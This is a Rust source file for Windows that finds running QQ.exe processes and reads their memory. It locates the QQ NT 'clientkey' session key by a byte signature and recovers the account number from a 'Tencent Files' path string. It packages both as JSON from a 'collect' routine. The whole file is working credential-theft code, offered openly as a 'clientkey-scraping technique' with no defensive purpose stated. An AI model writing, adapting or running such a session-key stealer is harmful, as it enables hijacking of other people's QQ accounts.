//! QQ NT clientkey (session key) extraction from `QQ.exe` process memory.
//!
//! Mirrors the classic QQ clientkey-scraping technique: locate the 96-bit
//! clientkey by its byte signature, and recover the account uin from the
//! `Tencent Files\` path string held in process memory.

pub struct QQClientKey;

impl QQClientKey {
    #[cfg(target_os = "windows")]
    pub fn collect() -> String {
        imp::collect()
    }

    #[cfg(not(target_os = "windows"))]
    pub fn collect() -> String {
        r#"{"total":0,"items":[]}"#.to_string()
    }
}

#[cfg(target_os = "windows")]
mod imp {
    use std::mem::size_of;

    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
    const MEM_COMMIT: u32 = 0x1000;
    const PAGE_NOACCESS: u32 = 0x01;
    const PAGE_GUARD: u32 = 0x100;

    const MAX_SCAN_BYTES: usize = 512 * 1024 * 1024;
    const CHUNK_SIZE: usize = 4 * 1024 * 1024;

    // 28 81 82 04 30 80 80 80 04 38 ?? ?? ?? ?? ?? 42 60
    const PATTERN: [u8; 17] = [
        0x28, 0x81, 0x82, 0x04, 0x30, 0x80, 0x80, 0x80, 0x04, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42,
        0x60,
    ];

    #[repr(C)]
    struct ProcessEntry32W {
        dw_size: u32,
        cnt_usage: u32,
        th32_process_id: u32,
        th32_default_heap_id: usize,
        th32_module_id: u32,
        cnt_threads: u32,
        th32_parent_process_id: u32,
        pc_pri_class_base: i32,
        dw_flags: u32,
        sz_exe_file: [u16; 260],
    }

    #[repr(C)]
    struct MemoryBasicInformation {
        base_address: usize,
        allocation_base: usize,
        allocation_protect: u32,
        _pad: u32,
        region_size: usize,
        state: u32,
        protect: u32,
        type_: u32,
    }

    extern "system" {
        fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> isize;
        fn Process32FirstW(hSnapshot: isize, lppe: *mut ProcessEntry32W) -> i32;
        fn Process32NextW(hSnapshot: isize, lppe: *mut ProcessEntry32W) -> i32;
        fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> isize;
        fn CloseHandle(hObject: isize) -> i32;
        fn VirtualQueryEx(
            hProcess: isize,
            lpAddress: usize,
            lpBuffer: *mut MemoryBasicInformation,
            dwLength: usize,
        ) -> usize;
        fn ReadProcessMemory(
            hProcess: isize,
            lpBaseAddress: usize,
            lpBuffer: *mut u8,
            nSize: usize,
            lpNumberOfBytesRead: *mut usize,
        ) -> i32;
    }

    pub fn collect() -> String {
        let pids = find_qq_pids();
        let mut items = Vec::new();
        let mut uins: Vec<String> = Vec::new();
        let mut open_failed: Vec<u32> = Vec::new();
        let mut pattern_found = false;

        for &pid in &pids {
            match scan_process(pid) {
                None => open_failed.push(pid),
                Some(o) => {
                    if let Some(u) = &o.uin {
                        if !u.is_empty() && !uins.contains(u) {
                            uins.push(u.clone());
                        }
                    }
                    if let Some(key) = &o.clientkey {
                        if !key.is_empty() {
                            pattern_found = true;
                            items.push(format!(
                                r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe"}}"#,
                                escape(&o.uin.unwrap_or_default()),
                                escape(key),
                                pid
                            ));
                        }
                    }
                }
            }
        }

        let pids_json = pids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
        let open_json = open_failed.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
        let uins_json = uins
            .iter()
            .map(|u| format!("\"{}\"", escape(u)))
            .collect::<Vec<_>>()
            .join(",");
        format!(
            r#"{{"total":{},"items":[{}],"uins":[{}],"diagnostics":{{"pids":[{}],"openFailed":[{}],"patternFound":{},"uinFound":{}}}}}"#,
            items.len(),
            items.join(","),
            uins_json,
            pids_json,
            open_json,
            pattern_found,
            !uins.is_empty()
        )
    }

    fn find_qq_pids() -> Vec<u32> {
        let mut pids = Vec::new();
        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == -1 {
                return pids;
            }
            let mut entry: ProcessEntry32W = std::mem::zeroed();
            entry.dw_size = size_of::<ProcessEntry32W>() as u32;
            if Process32FirstW(snap, &mut entry) != 0 {
                loop {
                    let name = wide_to_string(&entry.sz_exe_file);
                    if name.eq_ignore_ascii_case("QQ.exe") {
                        pids.push(entry.th32_process_id);
                    }
                    if Process32NextW(snap, &mut entry) == 0 {
                        break;
                    }
                }
            }
            CloseHandle(snap);
        }
        pids
    }

    fn scan_process(pid: u32) -> Option<ScanOutcome> {
        let h = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
        if h == 0 {
            return None;
        }

        let mut clientkey: Option<String> = None;
        let mut uin: Option<String> = None;

        unsafe {
            let mut addr: usize = 0x10000;
            let mut scanned_total: usize = 0;
            while scanned_total < MAX_SCAN_BYTES {
                let mut mbi: MemoryBasicInformation = std::mem::zeroed();
                let ret = VirtualQueryEx(h, addr, &mut mbi, size_of::<MemoryBasicInformation>());
                if ret == 0 || mbi.region_size == 0 {
                    break;
                }
                addr = mbi.base_address.wrapping_add(mbi.region_size);

                let committed = (mbi.state & MEM_COMMIT) != 0;
                let readable = (mbi.protect & (PAGE_NOACCESS | PAGE_GUARD)) == 0 && mbi.protect != 0;
                if !committed || !readable {
                    continue;
                }

                let region_size = mbi.region_size;
                let base = mbi.base_address;
                let mut offset = 0usize;
                while offset < region_size {
                    let chunk = (region_size - offset).min(CHUNK_SIZE);
                    let mut buf = vec![0u8; chunk];
                    let mut read = 0usize;
                    let ok = ReadProcessMemory(h, base + offset, buf.as_mut_ptr(), chunk, &mut read);
                    if ok == 0 || read == 0 {
                        break;
                    }
                    buf.truncate(read);

                    if clientkey.is_none() {
                        if let Some(pos) = find_pattern(&buf) {
                            let mut kb = [0u8; 96];
                            let mut kr = 0usize;
                            ReadProcessMemory(h, base + offset + pos + 17, kb.as_mut_ptr(), 96, &mut kr);
                            if kr > 7 {
                                clientkey = Some(trim_cstr(&kb[7..kr]));
                            }
                        }
                    }
                    if uin.is_none() {
                        uin = extract_uin(&buf);
                    }
                    if clientkey.is_some() && uin.is_some() {
                        break;
                    }

                    scanned_total += chunk;
                    offset += chunk;
                }
                if clientkey.is_some() && uin.is_some() {
                    break;
                }
            }
        }

        unsafe { CloseHandle(h) };

        Some(ScanOutcome { uin, clientkey })
    }

    struct ScanOutcome {
        uin: Option<String>,
        clientkey: Option<String>,
    }

    fn find_pattern(buf: &[u8]) -> Option<usize> {
        if buf.len() < PATTERN.len() {
            return None;
        }
        for i in 0..=(buf.len() - PATTERN.len()) {
            if buf[i..i + 10] == PATTERN[..10] && buf[i + 15] == 0x42 && buf[i + 16] == 0x60 {
                return Some(i);
            }
        }
        None
    }

    fn extract_uin(buf: &[u8]) -> Option<String> {
        let mark = b"Tencent Files\\";
        if let Some(pos) = find_subslice(buf, mark) {
            let after = &buf[pos + mark.len()..];
            let digits: String = after
                .iter()
                .take_while(|b| b.is_ascii_digit())
                .map(|b| *b as char)
                .collect();
            if digits.len() >= 5 {
                return Some(digits);
            }
        }

        let wide_mark: Vec<u8> = "Tencent Files\\"
            .encode_utf16()
            .flat_map(|c| [(c & 0xFF) as u8, (c >> 8) as u8])
            .collect();
        if let Some(pos) = find_subslice(buf, &wide_mark) {
            let after = &buf[pos + wide_mark.len()..];
            let mut digits = String::new();
            let mut i = 0;
            while i + 1 < after.len() {
                let c = after[i] as u16 | ((after[i + 1] as u16) << 8);
                if c >= b'0' as u16 && c <= b'9' as u16 {
                    digits.push(c as u8 as char);
                    i += 2;
                } else {
                    break;
                }
            }
            if digits.len() >= 5 {
                return Some(digits);
            }
        }

        None
    }

    fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
        if needle.is_empty() || haystack.len() < needle.len() {
            return None;
        }
        haystack.windows(needle.len()).position(|w| w == needle)
    }

    fn trim_cstr(bytes: &[u8]) -> String {
        let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
        String::from_utf8_lossy(&bytes[..end]).trim().to_string()
    }

    fn wide_to_string(ws: &[u16]) -> String {
        let end = ws.iter().position(|&c| c == 0).unwrap_or(ws.len());
        String::from_utf16_lossy(&ws[..end])
    }

    fn escape(s: &str) -> String {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n")
            .replace('\r', "\\r")
            .replace('\t', "\\t")
    }
}
